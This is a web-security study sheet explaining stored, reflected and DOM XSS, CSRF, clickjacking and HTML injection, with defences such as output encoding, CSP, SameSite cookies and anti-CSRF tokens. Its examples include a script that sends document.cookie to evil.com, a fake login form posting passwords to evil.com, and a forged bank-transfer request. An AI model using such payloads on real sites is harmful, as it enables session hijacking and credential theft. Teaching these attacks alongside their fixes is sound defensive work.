# Batch 4 — XSS & Client-Side Attacks
> Exploiting the browser and securing the client-side experience.

## 1. Cross-Site Scripting (XSS) - Stored

### Definition
Malicious scripts are permanently saved on the target server (e.g., in a database) and executed automatically whenever users view the infected page.

### Real-World Dev/Testing Example
An attacker posts a forum comment containing `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`. Every user who visits that thread unknowingly sends their session token to the attacker.

### ASCII Diagram
```text
[Attacker] --(Injects script)--> [Server DB]
                                      |
[Victims]  <--(Loads infected page)---+
```

### Gotchas & Dev Context
* **High impact:** Requires zero social engineering; anyone viewing the page is compromised.
* **Blind XSS:** Stored payloads can trigger in hidden admin panels or support portals weeks later.

### Production FAQ
* **How do we prevent this?**
  Apply context-aware output encoding right before rendering data to the browser.
* **Can a WAF stop it?**
  WAFs catch obvious payloads, but attackers easily obfuscate scripts to bypass them.

## 2. Cross-Site Scripting (XSS) - Reflected

### Definition
Malicious scripts are bounced off a web server in an immediate response, typically via a crafted URL or form input.

### Real-World Dev/Testing Example
A search page reflects the query: `You searched for: [INPUT]`. An attacker sends a victim the link `site.com/search?q=<script>alert('hacked')</script>`.

### Gotchas & Dev Context
* **Social engineering:** The attacker must trick the victim into clicking a specific, weaponized link.
* **Payload location:** The payload is in the HTTP request (URL or body), not saved on the server.

### Production FAQ
* **Do we still need output encoding here?**
  Yes. Any user input returned in the HTTP response must be HTML-encoded.
* **Will modern browsers block this?**
  Old browsers had XSS Auditors, but they were removed due to bypasses. It's strictly the developer's job now.

## 3. DOM-based XSS

### Definition
The vulnerability exists entirely in client-side JavaScript that insecurely reads user input and writes it to the Document Object Model (DOM).

### Real-World Dev/Testing Example
JavaScript reads the URL fragment `#` and updates the page: `document.getElementById('msg').innerHTML = window.location.hash;`. An attacker crafts a link like `site.com/#<img src=x onerror=alert()>` to trigger execution.

### Gotchas & Dev Context
* **Invisible to servers:** Browsers do not send the `#` fragment to the server. WAFs and server logs will never see the attack payload.
* **Sinks and Sources:** Data flows from a "source" (like `location.search`) to an unsafe "sink" (like `eval()` or `.innerHTML`).

### Production FAQ
* **How do we patch DOM XSS?**
  Use safe sinks. Replace `.innerHTML` with `.textContent` or `.innerText` so the browser treats the input as text, not code.

## 4. Cross-Site Request Forgery (CSRF)

### Definition
An attack that tricks an authenticated user's browser into performing an unwanted action on a trusted site without their knowledge.

### Real-World Dev/Testing Example
A victim logs into their bank. In another tab, they visit a malicious blog containing `<img src="http://bank.com/transfer?amount=1000&to=Attacker">`. The browser automatically attaches the victim's bank cookies and executes the transfer.

### ASCII Diagram
```text
[Victim] --1. Logs in--> [Bank Server]
   |
   +--2. Visits--> [Attacker Site] --3. Hidden request to Bank--> [Bank Server]
```

### Gotchas & Dev Context
* **Cookie behavior:** CSRF abuses the fact that browsers automatically attach session cookies to cross-origin requests.
* **No data theft:** CSRF cannot read the response (due to CORS); it only forces state-changing actions.

### Production FAQ
* **How do we fix this?**
  Use Anti-CSRF tokens and configure the `SameSite` attribute on session cookies.

## 5. Clickjacking

### Definition
An attacker overlays an invisible iframe of a target site over a decoy page, tricking the user into clicking hidden buttons on the target site.

### Real-World Dev/Testing Example
A "Win a Free iPhone!" button is placed directly over an invisible "Delete Account" button from an embedded iframe of a logged-in social media site.

### Gotchas & Dev Context
* **UI manipulation:** It exploits trust in the user interface rather than code logic.
* **Browser defenses:** Cannot be fixed by escaping output or sanitizing input.

### Production FAQ
* **How do we stop our site from being framed?**
  Send the `X-Frame-Options: DENY` HTTP header or use the `frame-ancestors 'none'` directive in a Content Security Policy (CSP).

## 6. HTML Injection

### Definition
Injecting plain HTML tags into a web page due to a lack of sanitization, altering the page layout or content without executing JavaScript.

### Real-World Dev/Testing Example
An attacker injects a fake login form `<form action="http://evil.com/log"><input type="password"></form>` into their public profile to harvest visitors' credentials.

### Gotchas & Dev Context
* **Precursor to XSS:** If attributes are allowed, it often escalates to XSS.
* **Phishing risk:** Extremely effective for defacement and social engineering.

### Production FAQ
* **Is this different from XSS?**
  Yes. HTML injection manipulates the DOM structure (visuals), whereas XSS executes active code (JavaScript). Both share the same root cause: missing output encoding.

## 7. Output Encoding / Escaping (Patching)

### Definition
Converting special characters into their safe HTML entity equivalents before rendering them, neutralizing executable code.

### Real-World Dev/Testing Example
A user submits `<script>`. The server encodes it as `&lt;script&gt;` before sending it to the browser. The browser renders the text literally instead of executing it.

### Gotchas & Dev Context
* **Context is king:** Encoding for an HTML body is different from encoding data inside a JavaScript variable or an HTML attribute.
* **Framework safety:** Modern frameworks (React, Angular) auto-encode by default.

### Production FAQ
* **Is encoding the same as sanitization?**
  No. Sanitization removes dangerous parts (e.g., stripping `<script>`), while encoding translates them safely. Encoding is generally safer and less prone to bypasses.

## 8. Content Security Policy (CSP) (Patching)

### Definition
An HTTP response header that acts as a strict allowlist for where resources (scripts, styles, images) can be loaded and executed from.

### Real-World Dev/Testing Example
A header like `Content-Security-Policy: default-src 'self';` blocks any inline scripts (`<script>alert()</script>`) and scripts loaded from unauthorized external domains.

### Gotchas & Dev Context
* **Defense in Depth:** CSP doesn't fix XSS; it mitigates the impact if an injection flaw exists.
* **Legacy pain:** Extremely hard to bolt onto older applications that rely heavily on inline JavaScript.

### Production FAQ
* **Why did my CSP break my app?**
  If your app uses inline event handlers (like `onclick=`) or inline `<script>` tags, a strict CSP will block them. Use a `Report-Only` mode first to debug.

## 9. SameSite Cookie Attribute (Patching)

### Definition
A cookie flag that dictates whether cookies should be sent along with cross-site requests, providing robust defense against CSRF.

### Real-World Dev/Testing Example
`Set-Cookie: session_id=xyz; SameSite=Lax` ensures the session cookie isn't sent on cross-origin POST requests (like a forced form submission from an attacker's site).

### Gotchas & Dev Context
* **Values:** `Strict` (no cross-site sending at all), `Lax` (sent on top-level safe navigations like GET links), and `None` (sent everywhere).
* **Modern defaults:** Browsers now default to `Lax` if the attribute is missing.

### Production FAQ
* **Does SameSite stop XSS?**
  No. It only protects against cross-site request forgery (CSRF). If an attacker gets XSS on your site, they are bypassing SameSite entirely.

## 10. Anti-CSRF Tokens

### Definition
Unpredictable, unique strings generated by the server and embedded in forms, required to validate state-changing requests.

### Real-World Dev/Testing Example
A hidden field `<input type="hidden" name="csrf_token" value="abc123xyz">` is submitted with a password change request. The server rejects the request if this token is missing or invalid.

### Gotchas & Dev Context
* **Stateless alternative:** For stateless APIs, the Double Submit Cookie pattern is often used instead of server-side token storage.
* **Token leakage:** Tokens must not be exposed in URLs (GET requests) where they can leak via the `Referer` header.

### Production FAQ
* **Do we need CSRF tokens for APIs?**
  If you use Authorization headers (like JWTs) instead of cookies for session management, CSRF is generally not possible, and tokens aren't needed.
